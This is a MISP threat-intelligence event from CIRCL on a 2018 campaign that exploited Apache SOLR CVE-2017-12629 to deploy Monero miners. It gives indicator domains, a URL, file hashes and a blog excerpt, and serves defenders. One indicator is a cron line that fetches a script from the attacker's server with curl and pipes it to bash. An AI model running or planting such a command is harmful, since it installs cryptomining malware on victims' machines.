{"Event": {"date": "2018-03-09", "publish_timestamp": "1520592420", "published": true, "info": "OSINT - Apache SOLR: the new target for cryptominers", "threat_level_id": "3", "timestamp": "1520592413", "extends_uuid": "", "uuid": "5aa23875-d0dc-49d6-82a6-d309950d210f", "analysis": "0", "Orgc": {"uuid": "55f6ea5e-2c60-40e5-964f-47a8950d210f", "name": "CIRCL"}, "Tag": [{"colour": "#ffffff", "name": "tlp:white"}, {"colour": "#a0a300", "name": "dnc:malware-type=\"CoinMiner\""}, {"colour": "#00223b", "name": "osint:source-type=\"blog-post\""}], "Attribute": [{"to_ids": false, "deleted": false, "value": "CVE-2017-12629", "uuid": "5aa238c3-5d80-4e7b-b10b-bcef950d210f", "timestamp": "1520581258", "disable_correlation": false, "comment": "", "category": "Payload delivery", "type": "vulnerability"}, {"to_ids": false, "deleted": false, "value": "Earlier this year, I wrote about a campaign targeting vulnerable Oracle WebLogic installations to deploy cryptocurrency miners [1] . Based on some of the mining pool statistics associated with these installs, criminals were quite successful. Now that most Oracle WebLogic servers are fixed, miscreants had to move to another target. Based on an incident I responded to on Thursday, vulnerable Apache SOLR servers may now be \u00e2\u20ac\u0153it\u00e2\u20ac\u009d.\r\n\r\nWithin 9 days (from Feb, 28 to Mar, 8) this single campaign exploited 1416 vulnerable Apache SOLR servers to deploy  Monero XMRig miners across the globe. There are enough similarities between these two attacks to suggest that this is the same group that was responsible for the WebLogic campaign. Log formats, file names and even the basic install script for the miner are identical. Of course, it is always possible that we are just dealing with copycats. These scripts have been out in the open for a while now.\r\n\r\nThe flaw (CVE-2017-12629) [2] first announced October 12th 2017, affects Apache SOLR version 7.1 and below. Due to an incorrectly configured XML parser in the \u00e2\u20ac\u0153queryparser\u00e2\u20ac\u009d library, attackers can get access to sensitive information or execute arbitrary code on vulnerable systems.\r\n\r\nThe CVSS v2 score is only \"High\" (7.5). But an exploit has been widely available since October 17th, less than a week after the vulnerability was made public. It is no surprise that attackers quickly turned to this easily executed exploit. The CVSS v3 score of \"Critical\" (9.8) is probably more appropriate.", "uuid": "5aa238d2-e450-49d6-bc69-d1cf950d210f", "timestamp": "1520586221", "disable_correlation": false, "comment": "", "category": "External analysis", "type": "text", "Tag": [{"colour": "#00223b", "name": "osint:source-type=\"blog-post\""}]}, {"to_ids": false, "deleted": false, "value": "https://isc.sans.edu/diary/23425", "uuid": "5aa238df-6aa0-47f7-a5dc-bcf2950d210f", "timestamp": "1520586219", "disable_correlation": false, "comment": "", "category": "External analysis", "type": "link", "Tag": [{"colour": "#00223b", "name": "osint:source-type=\"blog-post\""}]}, {"to_ids": true, "deleted": false, "value": "pool-proxy.com", "uuid": "5aa238ef-b014-436e-8ffd-bcef950d210f", "timestamp": "1520581259", "disable_correlation": false, "comment": "On port 8080", "category": "Network activity", "type": "domain"}, {"to_ids": true, "deleted": false, "value": "http://mms.kenguru.ru/includes/libraries/getsetup.php", "uuid": "5aa238f0-6154-41bc-b555-bcef950d210f", "timestamp": "1520581260", "disable_correlation": false, "comment": "", "category": "Network activity", "type": "url"}, {"to_ids": false, "deleted": false, "value": "https://isc.sans.edu/forums/diary/Campaign+is+using+a+recently+released+WebLogic+exploit+to+deploy+a+Monero+miner/23191/", "uuid": "5aa23a20-5738-495a-8c04-bdba950d210f", "timestamp": "1520581260", "disable_correlation": false, "comment": "", "category": "External analysis", "type": "url"}, {"to_ids": false, "deleted": false, "value": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-12629", "uuid": "5aa23a21-e0c4-44c4-862d-bdba950d210f", "timestamp": "1520581261", "disable_correlation": false, "comment": "", "category": "External analysis", "type": "url"}, {"to_ids": false, "deleted": false, "value": "https://www.securityfocus.com/bid/101261/info", "uuid": "5aa23a22-11a4-4be7-bc40-bdba950d210f", "timestamp": "1520581261", "disable_correlation": false, "comment": "", "category": "External analysis", "type": "url"}, {"to_ids": true, "deleted": false, "value": "25 0,3,6,9,12,15,18 * * * curl -s \"hxxp://mms.kenguru.ru/includes/libraries/getsetup.php?p=sl\" | bash", "uuid": "5aa24db3-ab7c-4f72-9ae8-bcf2950d210f", "timestamp": "1520586163", "disable_correlation": false, "comment": "", "category": "Artifacts dropped", "type": "pattern-in-file"}], "Object": [{"template_version": "9", "deleted": false, "template_uuid": "688c46fb-5edb-40a3-8273-1af7923e2215", "meta-category": "file", "comment": "", "sharing_group_id": "0", "distribution": "5", "timestamp": "1520580946", "description": "File object describing a file with meta-information", "uuid": "5aa23952-98bc-429a-90e3-bcf2950d210f", "name": "file", "Attribute": [{"to_ids": true, "deleted": false, "value": "fs-manager", "object_relation": "filename", "uuid": "5aa23952-2374-4750-b93a-bcf2950d210f", "timestamp": "1520580946", "disable_correlation": true, "comment": "", "category": "Payload delivery", "type": "filename"}, {"to_ids": true, "deleted": false, "value": "7153ac617df7aa6f911e361b1f0c8188ca5c142c6aaa8faa2a59b55e0b823c1c", "object_relation": "sha256", "uuid": "5aa23952-681c-454e-83e6-bcf2950d210f", "timestamp": "1520580946", "disable_correlation": false, "comment": "", "category": "Payload delivery", "type": "sha256"}, {"to_ids": false, "deleted": false, "value": "Malicious", "object_relation": "state", "uuid": "5aa23952-bf9c-4b36-9307-bcf2950d210f", "timestamp": "1520580946", "disable_correlation": true, "comment": "", "category": "Other", "type": "text"}]}, {"template_version": "9", "deleted": false, "template_uuid": "688c46fb-5edb-40a3-8273-1af7923e2215", "meta-category": "file", "comment": "", "sharing_group_id": "0", "distribution": "5", "timestamp": "1520581105", "description": "File object describing a file with meta-information", "uuid": "5aa239f1-e340-4ce1-ad60-d1cf950d210f", "name": "file", "Attribute": [{"to_ids": true, "deleted": false, "value": "config.json", "object_relation": "filename", "uuid": "5aa239f1-ccf0-4bdf-8ec7-d1cf950d210f", "timestamp": "1520581105", "disable_correlation": true, "comment": "", "category": "Payload delivery", "type": "filename"}, {"to_ids": true, "deleted": false, "value": "a3bbc8d3c4a950fa0b0def4109a07e9d01bae157781ff7a4b07910340e021dc7", "object_relation": "sha256", "uuid": "5aa239f1-cb2c-4463-9677-d1cf950d210f", "timestamp": "1520581105", "disable_correlation": false, "comment": "", "category": "Payload delivery", "type": "sha256"}, {"to_ids": false, "deleted": false, "value": "Malicious", "object_relation": "state", "uuid": "5aa239f2-0234-4f35-ae63-d1cf950d210f", "timestamp": "1520581106", "disable_correlation": true, "comment": "", "category": "Other", "type": "text"}]}, {"template_version": "7", "deleted": false, "template_uuid": "688c46fb-5edb-40a3-8273-1af7923e2215", "meta-category": "file", "comment": "", "sharing_group_id": "0", "distribution": "5", "timestamp": "1520581264", "description": "File object describing a file with meta-information", "uuid": "9e8fc8b5-70d8-445c-8e8d-f004090a0793", "name": "file", "ObjectReference": [{"object_uuid": "9e8fc8b5-70d8-445c-8e8d-f004090a0793", "relationship_type": "analysed-with", "referenced_uuid": "98e27b75-981b-467e-bfe6-36b058da4dc4", "timestamp": "1520581265", "comment": "", "uuid": "5aa23a91-6fac-49c8-83b8-d78802de0b81"}], "Attribute": [{"to_ids": true, "deleted": false, "value": "ea0a6633b2f8592028c31aefbfe8f8165076b786", "object_relation": "sha1", "uuid": "5aa23a8e-2ea0-4bb6-9152-d78802de0b81", "timestamp": "1520581262", "disable_correlation": false, "comment": "", "category": "Payload delivery", "type": "sha1"}, {"to_ids": true, "deleted": false, "value": "7153ac617df7aa6f911e361b1f0c8188ca5c142c6aaa8faa2a59b55e0b823c1c", "object_relation": "sha256", "uuid": "5aa23a8e-7d28-4f78-8ab5-d78802de0b81", "timestamp": "1520581262", "disable_correlation": false, "comment": "", "category": "Payload delivery", "type": "sha256"}, {"to_ids": true, "deleted": false, "value": "09536b6ee3e600e73436715030467ec9", "object_relation": "md5", "uuid": "5aa23a8f-c760-4af1-91a3-d78802de0b81", "timestamp": "1520581263", "disable_correlation": false, "comment": "", "category": "Payload delivery", "type": "md5"}]}, {"template_version": "1", "deleted": false, "template_uuid": "d7dd0154-e04f-4c34-a2fb-79f3a3a52aa4", "meta-category": "misc", "comment": "", "sharing_group_id": "0", "distribution": "5", "timestamp": "1520581263", "description": "VirusTotal report", "uuid": "98e27b75-981b-467e-bfe6-36b058da4dc4", "name": "virustotal-report", "Attribute": [{"to_ids": false, "deleted": false, "value": "https://www.virustotal.com/file/7153ac617df7aa6f911e361b1f0c8188ca5c142c6aaa8faa2a59b55e0b823c1c/analysis/1519925650/", "object_relation": "permalink", "uuid": "5aa23a90-e4bc-4ba6-8338-d78802de0b81", "timestamp": "1520581264", "disable_correlation": false, "comment": "", "category": "External analysis", "type": "link"}, {"to_ids": false, "deleted": false, "value": "22/60", "object_relation": "detection-ratio", "uuid": "5aa23a91-9ae4-42e4-a3ef-d78802de0b81", "timestamp": "1520581265", "disable_correlation": true, "comment": "", "category": "Other", "type": "text"}, {"to_ids": false, "deleted": false, "value": "2018-03-01T17:34:10", "object_relation": "last-submission", "uuid": "5aa23a91-ffb8-41ad-8a57-d78802de0b81", "timestamp": "1520581265", "disable_correlation": false, "comment": "", "category": "Other", "type": "datetime"}]}]}}